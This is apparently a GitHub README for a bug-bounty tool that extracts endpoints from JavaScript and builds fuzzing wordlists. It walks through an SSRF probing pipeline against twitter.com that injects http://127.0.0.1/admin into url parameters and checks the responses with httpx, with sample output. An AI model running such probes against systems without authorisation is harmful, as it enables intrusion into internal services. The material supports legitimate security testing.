# wordlistgen
Generates target specific word lists by searching for endpoints in javascript and appends parameters for Fuzzing with other tools

**Version 1.0**


### Install

**`$ go get -u github.com/ethicalhackingplayground/wordlistgen`**

**`$ go get github.com/003random/getJS`**


![GitHub Logo](carbon.png)


### Generate wordlist
**`$ echo "https://www.twitter.com" | getJS -complete | ./wordlistgen -p params.txt -d "https://www.twitter.com"`**

![GitHub Logo](carbon2.png)

The use ffuf


**Then get creative with FFuF or https://github.com/tomnomnom/qsreplace**

****
### SSRF TIP2:


#### Generate Wordlist
**`$ cat <Resolved-Domains> | getJS -complete | ./wordlistgen -p params.txt -d <Un-Resolved> | tee wordlist`**

**`$ cat "https://www.twitter.com" | getJS -complete | ./wordlistgen -p params.txt -d "www.twitter.com" | tee wordlist`**

```
OUTPUT:

www.twitter.com/responsive-web-internal/sourcemaps/client-web-legacy/polyfills.525f28f5.js.map/?url=FUZZ
www.twitter.com/v/latest/72x72//?url=FUZZ
www.twitter.com/responsive-web-internal/sourcemaps/client-web-legacy/en.363b7e25.js.map/?url=FUZZ
www.twitter.com/articles/18311/?url=FUZZ
```

###### You can also use `-dL` to load a list of subdomains like:
**`$ cat <Resolved-Domains> | getJS -complete | ./wordlistgen -p params.txt -dL <Un-Resolved> | tee wordlist`**


##### Replace Variables with Payload
**`$ cat wordlist | qsreplace http://127.0.0.1/admin | tee -a hosts`**

```
OUTPUT:

www.twitter.com/responsive-web-internal/sourcemaps/client-web-legacy/polyfills.525f28f5.js.map/?url=http%3A%2F%2F127.0.0.1%2Fadmin
www.twitter.com/v/latest/72x72//?url=http%3A%2F%2F127.0.0.1%2Fadmin
www.twitter.com/responsive-web-internal/sourcemaps/client-web-legacy/en.363b7e25.js.map/?url=http%3A%2F%2F127.0.0.1%2Fadmin
www.twitter.com/articles/18311/?url=http%3A%2F%2F127.0.0.1%2Fadmin
```

#### Use HTTPX to keep track of the codes,titles
**`$ cat hosts | httpx -title -status-code`**

#### I hope you get a bounty with this technique.
****


**If you get a bounty please support by buying me a coffee**

<br>
<a href="https://www.buymeacoffee.com/krypt0mux" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
